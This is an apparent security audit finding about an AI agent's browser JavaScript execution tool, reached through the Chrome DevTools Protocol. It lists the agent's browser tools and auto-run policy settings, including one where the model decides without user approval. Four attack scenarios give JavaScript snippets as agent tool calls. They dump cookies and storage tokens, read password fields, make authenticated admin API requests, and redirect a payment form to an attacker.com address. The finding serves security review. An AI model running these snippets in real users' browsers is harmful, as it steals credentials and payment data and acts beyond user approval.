# Finding 05: Unrestricted Browser JavaScript Execution via CDP

**Severity:** `high` | **Confidence:** `confirmed` | **Category:** Code Execution / Credential Theft

---

## Summary

The Antigravity agent has a dedicated tool `execute_browser_javascript` backed by Chrome DevTools Protocol (CDP) `Runtime.evaluate`. This allows the agent to execute **arbitrary JavaScript** in any open browser page — reading cookies, localStorage, session tokens, form data, and making authenticated network requests as the user.

## Evidence

### Tool Handler in Go Binary

```
third_party/jetski/cortex/handlers/execute_browser_javascript_handler.go
```

### Execution Confirmation Strings

From the language server binary:
```
"Successfully executed the JavaScript in Browser page_id: "
"Successfully captured console logs from Browser page_id: "
"execute javascript to get window inner width"
```

### CDP Operations Available

From binary string extraction:
```
Runtime.evaluate           — Execute arbitrary JS
DOM.getOuterHTML           — Read full DOM
DOM.describeNode           — Inspect DOM nodes
DOM.setNodeValue           — Modify DOM
DOM.setOuterHTML           — Replace DOM content
Input.insertText           — Type into fields
DispatchKeyEvent           — Send keyboard events
Page.stopLoading           — Control navigation
GetLayoutMetrics           — Read page dimensions
GetSearchResults           — Search DOM
QuerySelectorAll           — CSS selector queries
GetManifestIcons           — Read manifest
GetAnchorElement           — Get anchor elements
```

### Full Browser Tool Suite (30+ tools)

```
browser_url                    — Navigate to any URL
browser_click / browser_click_element — Click interactions
browser_input                  — Text input
browser_press_key              — Keyboard events
browser_screenshot             — Take screenshots
browser_javascript             — Execute arbitrary JS
browser_get_dom                — Read full DOM tree
browser_pages                  — List all open pages
browser_console_logs           — Read console output
browser_get_network_request    — Inspect network traffic
browser_list_network_requests  — List all network requests
browser_drag_pixel_to_pixel    — Drag and drop
browser_mouse_move/down/up     — Low-level mouse control
browser_subagent               — Spawn browser sub-agents
browser_refresh_page           — Force refresh
browser_resize_window          — Resize viewport
```

### Policy Controls

```
BROWSER_JS_EXECUTION_POLICY: "browserJsExecutionPolicy"
BROWSER_ALLOWLIST: "browserAllowlist"
BROWSER_CHROME_PATH: "browserChromePath"
BROWSER_CDP_PORT: "browserCdpPort"
```

Auto-run policy (from protobuf enum):
```
BROWSER_JS_AUTO_RUN_POLICY_UNSPECIFIED  = 0
BROWSER_JS_AUTO_RUN_POLICY_ASK          = 1
BROWSER_JS_AUTO_RUN_POLICY_MODEL_DECIDES = 2
BROWSER_JS_AUTO_RUN_POLICY_ENABLED      = 3
```

**Note:** `MODEL_DECIDES` means the AI model itself decides whether to auto-run JS — not the user.

## Attack Scenarios

### Scenario 1: Session Token Theft
```
Agent: browser_javascript("JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
})")
→ Returns all authentication tokens from the current page
```

### Scenario 2: Credential Capture
```
Agent: browser_javascript("
    document.querySelectorAll('input[type=password]')
        .forEach(el => console.log(el.value))
")
→ Reads passwords from form fields
```

### Scenario 3: Authenticated API Calls
```
Agent: browser_javascript("
    fetch('/api/admin/users', {credentials: 'include'})
        .then(r => r.json())
        .then(d => console.log(JSON.stringify(d)))
")
→ Makes authenticated API requests using the user's session
```

### Scenario 4: DOM Manipulation
```
Agent: browser_javascript("
    document.querySelector('#payment-form').action = 'https://attacker.com/steal'
")
→ Redirects form submissions to attacker
```

## Impact

1. **Any authenticated web session** visible in the browser is accessible to the agent
2. **No origin restrictions** — CDP operates at browser level, not page level
3. **Network request inspection** — agent can read request/response headers including auth tokens
4. **Screenshot + console** — visual and programmatic access to page state
5. **Auto-run policies** allow the model to decide whether to execute JS without user approval

## Mitigations Present

- `browserAllowlist` — restricts which URLs the agent can visit
- `browserJsExecutionPolicy` — controls JS execution
- `BROWSER_JS_AUTO_RUN_POLICY_ASK` — requires user approval (default unclear)

## Mitigations Missing

- No Content Security Policy for agent-executed JS
- No sandboxing of the CDP connection
- No restriction on what JS APIs are available (full browser API surface)
- No audit logging of JS execution
- `MODEL_DECIDES` policy puts the security decision on the AI model itself
